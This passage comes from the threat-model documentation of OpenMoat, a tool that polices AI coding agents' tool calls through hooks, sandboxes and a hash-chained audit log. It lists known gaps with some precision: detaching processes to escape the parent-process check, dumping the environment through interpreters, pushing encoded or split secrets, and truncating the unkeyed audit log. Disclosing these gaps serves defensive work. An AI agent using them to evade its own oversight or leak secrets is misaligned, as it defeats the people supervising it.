  `moat` would then block every settings reload. Before 2.1.295, Claude Code's own deny
  rules for secrets and OpenMoat's files, which `moat init` writes on every OS, still
  hold for its file tools. A `guard` that hangs denies after 30 s, well
  before any host timeout `moat init` sets (60 s for the settings-change hook, 600 s
  for tool calls), so the host never reaches the timeout that would run the call; that
  deny goes to a side file (`~/.moat/guard-hangs.log`, which `moat doctor` reports with
  the step the guard was stuck in), not the audit log, because what hangs may be the
  audit log. The limit is wall-clock time, so a heavily loaded machine can reach it
  with a call that is only slow; the call is then denied, never allowed.

  [cc-hooks]: https://code.claude.com/docs/en/hooks
  [codex-hooks]: https://developers.openai.com/codex/hooks
  [codex-pre]: https://github.com/openai/codex/blob/main/codex-rs/hooks/src/events/pre_tool_use.rs
  [codex-runner]: https://github.com/openai/codex/blob/main/codex-rs/hooks/src/engine/command_runner.rs
  [cursor-hooks]: https://cursor.com/docs/agent/hooks
  [cn-runner]: https://github.com/continuedev/continue/blob/main/extensions/cli/src/hooks/hookRunner.ts
- **The Continue CLI.** The released Continue CLI does not run hooks: `cn` 1.5.47 (continuedev/continue
  `main` at `5522c6f`) loads them but fires no event (continuedev/continue#11043 closed
  unmerged), so OpenMoat cannot check its tool calls today. Run `cn` under `moat run`. When a
  release fires them, `cn` will load OpenMoat's Claude Code hook from
  `~/.claude/settings.json` and `.claude/settings.json`; `guard` already recognises
  `cn` and sends it every `ask` as a deny (ARCHITECTURE §5), and the table above shows
  what its hook runner does on a failure.
  `moat doctor` and `moat status` warn when `cn` is on the search path or its directory
  (`~/.continue`, or `CONTINUE_GLOBAL_DIR`) exists. `cn` names some tool arguments
  differently (`Read` `filepath`); those calls are denied as malformed.
- **Cursor file tools cannot ask.** Cursor runs a `preToolUse` call answered `ask`
  and accepts only allow or deny from `beforeReadFile`, so OpenMoat sends an `ask`
  there as a deny. A file write or read that needs approval is blocked until a person
  approves that exact file with `moat` or `moat allow --last`, or a policy allow rule
  covers it.
- **Ungoverned tools.** Claude Code orchestration tools whose own calls are hooked;
  Codex web search (a hosted tool its hook never sees) and other hosted tools;
  Cursor `Shell` and `MCP:<tool>` under `preToolUse` (governed by `beforeShellExecution`
  and `beforeMCPExecution` instead), `Task`, and to-do tools (`TodoWrite`) that name no path. Ungoverned calls that reach the hook are
  recorded with rule `ungoverned` and left to the host's own permission flow (allowed
  under Cursor, whose hooks cannot leave a call undecided). Any other Cursor tool that names no path
  is `tool.unknown`, which the default policy defers; Cursor's `preToolUse` cannot
  prompt, so there OpenMoat asks (POLICY.md §5). Claude Code and Cursor `WebSearch` are
  governed: `web.search` in `defaults` decides them, and a search after a secret read asks.
- **No settings veto outside Claude Code.** Codex and Cursor have no `ConfigChange`
  event, so a tampered hook file there is caught on the next tool call, not when it
  is written.
- **Codex does not send a command's `workdir`.** Codex's shell tools take a `workdir`
  argument and run the command there, but the `PreToolUse` payload carries only the
  command, so a relative path in it is checked against the session's directory, not
  the one Codex runs it in. Absolute paths and `**/` patterns (`.env` anywhere) are
  unaffected, and Codex's own sandbox (the `moat` profile) still applies to the
  command where it runs. Until Codex sends `workdir`, OpenMoat cannot see it.
- **PowerShell is not parsed.** Claude Code `PowerShell` is always `unparseable`, which
  the default policy defers to Claude Code's own prompt (and an `ask` catch-all asks). A
  PowerShell line given to a POSIX shell tool is lexed as POSIX and usually falls through
  to the catch-all default.
- **Pattern lists are incomplete by nature.** Pseudo-terminal routes to `moat allow`
  (ADR-011, ADR-014), environment dumps through interpreters (`python -c
  'print(os.environ)'`, ADR-010), and options that run programs (ADR-012) are matched
  by lists. Spellings outside the lists defer to the agent's own prompt or, if a broad allow covers them, are
  allowed.
- **Interpreter code is scanned, not parsed.** A file that inline `python -c`, `node -e`
  or similar code opens for writing is not checked as a write.
- **TOCTOU and hard links.** A link swapped between the check and the command
  running, and hard links, are not seen (ADR-009).
- **Glob operands are expanded at decision time.** An unquoted `* ? [` path operand
  is checked as every file it matches when the hook runs (POLICY.md §4), with
  `bash` defaults (no `dotglob`, `nocaseglob` or `extglob`; `**` as `globstar`;
  a pattern starting with `.` also names `.` and `..`, as bash before 5.2 does). A
  file created between the check and the command that a pattern's last component
  matches is not seen. Shell options that change matching (`shopt -s dotglob
  nocaseglob extglob`, `zsh` `EXTENDED_GLOB` and `GLOB_DOTS`), `zsh` qualifiers and
  `<1-9>` ranges are not modelled. Brace expansion follows `bash`, also for shells
  that do not expand braces (`sh` as `dash`), where the literal word is not checked. Claude Code
  `Glob` and `Grep` are checked as reads of their search directory, as before:
  `Glob` returns names, not contents, and `Grep` searches the whole directory
  whatever its `glob` filter.
- **The terminal check is not a boundary.** `moat allow`, `moat edit`, `moat secret`, `moat trust`, `moat uninstall`,
  `moat sandbox sync`, `moat mcp accept`/`wrap`/`unwrap` and `moat doctor --accept` check
  for a TTY, and refuse when an
  agent (`claude`, `codex`, `cursor-agent`, or `moat run`) is among their parent
  processes; answers are read from `/dev/tty`. An agent can still detach a process from
  its own tree (a double fork, `setsid`, a launchd or systemd job), which the parent
  check cannot see; on Windows only the TTY is checked; and Cursor's editor agent runs its
  commands in the same process tree as the person's own terminals there, so it is not told
  apart. The `kernel-self` rules and the lock are what stop an agent from
  re-pinning or granting itself anything.
- **Some Claude Code settings may drift without stopping the guard.** Claude Code's
  `settings.json` is pinned, but a change limited to an allowlist of its keys
  (`crates/openmoat-cli/src/integrity/relaxed.rs`) does not deny every call: display
  and reply toggles, and Claude Code's own `permissions.allow`, `ask`, `deny`,
  `defaultMode`, `additionalDirectories` and `blockReadsOutsideWorkingDirectories`.
  The hook still decides every call by the policy, and Claude Code obeys a hook deny in
  every permission mode, so these change only when Claude Code asks the person about a
  call the hook left to it. Two of them widen more than prompts: with
  `blockReadsOutsideWorkingDirectories` off, sandboxed commands may read the home
  directory outside the working directories, and `additionalDirectories` adds
  directories sandboxed commands may write. No guard decision depends on the sandbox,
  `moat status` shows the agent as `hook only` while its sandbox differs from the
  policy, and `moat doctor` reports the drift until a person runs `moat doctor --accept`.
  A change under `hooks`, a key that runs a program or redirects the agent (`env`,
  `apiKeyHelper`, `awsAuthRefresh`, `awsCredentialExport`, `otelHeadersHelper`,
  `statusLine`, `fileSuggestion`, the model, plugins, MCP servers, `sandbox`), a
  removed `permissions.deny` rule OpenMoat wrote, an unknown key, a symlink or a file
  that no longer parses still denies every call. The kernel-self rules deny the agent
  writes to the settings file in any case.
- **Repository rules are hook-only, and a repository can block itself.** A
  repository policy is merged into the hook decision only. Host sandboxes and
  `moat proxy` are generated per user from the user policy, so a repository deny is
  not enforced by an OS layer. A malicious or broken repository policy can deny
  every call in its own project (`kernel-error`). Any repository could do the same
  with one deny rule, and it fails closed. By itself it cannot widen anything: its
  ask rules never soften a user deny, and its allow rules wait for `moat trust`.
  Once trusted, its allow rules are as strong as the person's own, below the
  person's deny rules. A trusted repository whose maintainers turn malicious
  widens only through a new file version, which drops back to tightening-only
  until someone trusts it again (ADR-022).
- **The binary is pinned by path, not digest** (ADR-006, ADR-016). Whoever can replace
  the file the stable link points at decides what the hooks run. The recorded path, its
  directory and its link target are protected by literal path (`kernel-self`, every
  host sandbox, Claude Code's deny rules); a digest check would add nothing, since a
  replaced binary decides whether to run it.
- **Claude Code's `theme` setting is not pinned** (#287). Claude Code writes it to
  `settings.json` itself; it changes only colours, and every other key stays pinned.
- **`CLAUDE_CONFIG_DIR` must match for `init`.** `moat init` installs hooks where its
  own environment points and records that directory in `~/.moat/hosts.json`, which the
  lock pins; later commands use the record, not their shell's variables, and `doctor`
  reports a variable that disagrees (#298). An agent started with another directory
  than the recorded one is not hooked. Re-pinning (`allow`, `doctor --accept`) keeps
  every hook file the lock already pins, and `doctor`/`status` report an installed hook
  file the lock does not pin (#158). `kernel-self` covers both each agent's recorded
  directory and the one its variable names.

- **The audit chain is tamper-evident, not tamper-proof.** The hash chain
  ([ARCHITECTURE.md](ARCHITECTURE.md) §7) makes an edit, a deletion or a reordering in the middle of the
  log visible to `moat doctor`. It is unkeyed and lives in the file it protects, so
  whoever can write `~/.moat/audit.db` (the user's account, or an allowed command
  running as the user, see "Outside the sandboxes") can delete the newest events and leave a
  valid shorter chain (an agent's `sqlite3 ~/.moat/audit.db …` is a write that
  `kernel-self` denies), or rewrite events and recompute every hash after them. Keeping
  the head hash or count elsewhere on the same machine would need a second write on
  every `guard` call and could be rewritten by the same attacker, so it is not done.
  Anchoring the head off the machine is left to the person (ADR-031): `moat audit
  anchor --git <repo>` commits the head on `refs/moat/anchors` in a repository they
  name, or `--file` appends it to a file they keep, and `moat audit verify --against`
  later fails, naming the anchor, once an anchored event is gone or has another hash.
  An anchor is only as safe as where it is kept: one in a repository or file on the
  same machine that is never pushed or copied elsewhere can be rewritten by the same
  attacker, and OpenMoat sends nothing anywhere itself. Events after the newest anchor
  are not covered, and nor are events written before audit schema 2. `moat audit
  verify --anchor` checks an export against a recorded head the same way.
- **Reading OpenMoat's state.** `kernel-self` denies the agent reads of the audit log,
  the lock, `hosts.json`, the approvals, the trust records and the MCP pins, and the host
  sandboxes and `moat run` carry those denies. Landlock (`moat run` on Linux) only
  grants and cannot deny inside a granted tree, so there `moat run` refuses to start
  when a tree it grants (the project, a read root such as `/tmp`, a `--write` path,
  the temp directory) holds the state directory or lies inside it, symlinks resolved,
  and says to move `MOAT_HOME` out of it. `moat run --isolate` starts only where its
  mounts hide the state directory: below the temp directory, which it covers with an
  empty `tmpfs`. The default `~/.moat` is in none of the default grants. `moat doctor`
  warns on Linux when the state directory is inside the project, a read root or the
  temp directory.
  `policy.yaml` is readable on purpose: the rules are no secret, and an agent that can
  read them can explain a deny.
- **What a policy signature proves** (ADR-031). That a key the person trusted with
  `moat policy trust-key` signed those exact bytes in the namespace `openmoat-policy`;
  not that the signer meant well. A stolen signing key signs packs the person will
  install, and a trusted key's signed repository policy is trusted wherever
  `require_signed_repo_policy` is on. With it on, a repository policy no trusted key
  signed is not trusted even after `moat trust`, so a `trust.json` record cannot widen
  the policy on its own. Verification runs the system `ssh-keygen` found
  through the pinned environment snapshot, so a replaced `ssh-keygen` at that path is
  trusted as `git` is. A signed repository policy is checked on each call in the
  project, which costs an `ssh-keygen` run per trusted signer on each call there.
- **What verifying an export proves.** `moat audit verify` shows that every line is
  the event its hash commits to, and that runs of consecutive ids are unbroken
  links. It does not show that the export is complete. Dropping the newest lines,
  or exporting from a truncated log, leaves a file that verifies, and so does
  deleting a middle event, which looks like a filter gap. Only an anchored head
  catches those: a recorded hash that the export must contain. Without `--anchor`,
  `moat audit verify` reports the export as not anchored, and `--require-anchor`
  makes that a failure for scripts. The anchor does not
  cover events after it. Anyone who can write the database can recompute every hash
  before exporting (the chain is unkeyed), so an export is evidence about the log
  as it was at export time, no more. Exported cells are the redacted store cells.
  A secret shape that redaction learned after an event was recorded stays in that
  event.
- **What the push check sees.** It looks for token formats with a vendor prefix and
  for brokered values the guard can read (not keychain ones), in the lines a push's
  commits add and in their messages: a secret of no known format, an encoded or split
  value, and anything in a binary file are pushed. It reads the repository when the call
  is decided, so a commit made later on the same command line (`git commit -am x && git
  push`) is not checked, and neither is a push by another program (a script, `curl` to
  the forge's API) or one moved to another repository by a variable an earlier call
  exported. What the remote has is taken from the remote-tracking branches git knows
  of: commits git believes the remote has are not checked again, even if the remote has
  dropped them since. A sample
  token in a project's test data denies the push too; a person pushes it from a terminal.
- **What audit redaction guarantees.** The value of a brokered secret of 8 bytes or
  more never appears verbatim, in any letter case, in a row the proxy records, nor in
  the row of a call the policy decides in `moat guard` when the secret has a `file`
  or `env` source the guard can read. Known token formats are removed by pattern. Nothing else is guaranteed: a
  secret OpenMoat does not hold (one only in the agent's environment or files) and of
  no known format is stored as sent; so is a brokered value that was encoded (base64,
  URL escapes), split, or shorter than 8 bytes; a keychain-sourced value is not
  masked in guard rows; values from before a secret was added stay in old rows. The
  matcher's copy of the values is not zeroed when the process exits. Redaction limits
  what the log reveals; it does not stop the secret being sent, which is the policy's
  and the proxy's job.

## 6. How the claims are tested

- **Conformance suite.** `tests/conformance/{attacks,benign,ask}.yaml`: one tool
  call per fixture, with the verdict and rule ids the default policy must give. Every
  attack and ask fixture names its threat class, every class needs at least one
  attack fixture, and [COVERAGE.md](COVERAGE.md) is generated from them. Every valid
  bypass becomes a fixture before its fix is published.
- **End-to-end tests** run the real binary as a hook in isolated homes: lock drift,
  `ConfigChange`, approvals, install paths, every host's payloads.
- **MoatBench mini** ([MOATBENCH.md](MOATBENCH.md)): multi-step attack and benign
  scenarios sent as Claude Code, Codex and Cursor payloads to the real binary, with a
  scorecard of verdicts, false positives and known gaps.
- **Fuzzing.** `cargo fuzz` targets for the shell path through the engine, policy
  parsing, host payloads and `moat allow --always` patterns run in CI on every pull
  request and weekly.
- **Differential suite** (`tests/differential/scenarios.yaml`): each scenario runs
  against the hook decision and each host sandbox whose binary is present, and hostile
  project scripts run under `moat run`, Claude Code's sandbox and Codex's `moat`
  profile on macOS and Linux, with the OS outcome (`EPERM`, `EACCES`, a proxy's 403)
  asserted. CI's `standard tier` job runs the host sandboxes with pinned Claude Code
  and Codex binaries, a local fake API and no account. [EVIDENCE.md](EVIDENCE.md) is
  the results table, generated from the same file; known gaps are listed there as gaps.
- **Lexer against bash** (`crates/openmoat-core/tests/lexer_vs_bash.rs`): the conformance
  `shell:` lines and a set of quoting and operator cases run under a real bash with an
  empty `PATH`, whose `command_not_found_handle` records each command's argv, and the
  argv is compared with the lexer's words. Lines bash would expand (variables,
  substitutions, globs, braces, `~`) or that use builtins are skipped. CI's `lexer-vs-bash`
  job runs it on Linux; it is not a required check yet.
- **Planned:** the full MoatBench, which measures attack success with and without OpenMoat across live agents ([ROADMAP.md](ROADMAP.md)). Prompt fatigue is measured
  today only by `moat report` (asks per active hour).
